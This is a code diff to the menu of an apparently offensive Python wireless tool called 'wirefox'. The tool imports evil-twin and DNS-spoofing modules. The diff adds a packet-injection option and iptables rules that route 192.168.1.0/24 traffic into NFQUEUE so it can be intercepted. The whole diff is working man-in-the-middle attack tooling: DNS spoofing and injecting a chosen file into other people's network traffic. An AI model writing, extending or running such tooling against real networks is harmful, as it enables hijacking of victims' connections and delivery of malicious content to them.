@@ -9,6 +9,7 @@ except:
 import os
 from evil_twin import evil_twin
 from DnsSpoofing import DnsSpoofing
+from PacketInjection import PacketInject
 
 
 def logo():
@@ -49,13 +50,30 @@ def wirefox():
         hosts = input(u"\u001b[33;1m[^] (All dns spoofing or just Config hosts? A/C) # ")
         if hosts == "A" or hosts == "a" or hosts == "all" or hosts == "All":
             ip = input(u"\n\u001b[33;1m[^] (IP For Spoof)-> ")
+            print(u"\u001b[32m")
             os.system("iptables -I INPUT -d 192.168.1.0/24 -j NFQUEUE --queue-num 0")
             DnsSpoofing.start(ip)
         elif hosts == "C" or hosts == "c" or hosts == "Config" or hosts == "config":
+            os.system("iptables -I INPUT -d 192.168.1.0/24 -j NFQUEUE --queue-num 0")
             try:
                 DnsSpoofing.start()
             except:
                 os.system("iptables --flush")
                 sys.exit(1)
+
+    elif option == "4":
+        try:
+            file = input(u"\u001b[33;1m[^] (File address for inject)-> ")
+            os.system("iptables -I INPUT -d 192.168.1.0/24 -j NFQUEUE --queue-num 0")
+
+            PacketInject.start(file)
+
+        except KeyboardInterrupt:
+            os.system("iptables --flush")
+            sys.exit(1)
+        except FileNotFoundError:
+            print(u"\u001b[31m[*] File Not Found!")
+            os.system("iptables --flush")
+            sys.exit(1)
 
 wirefox()
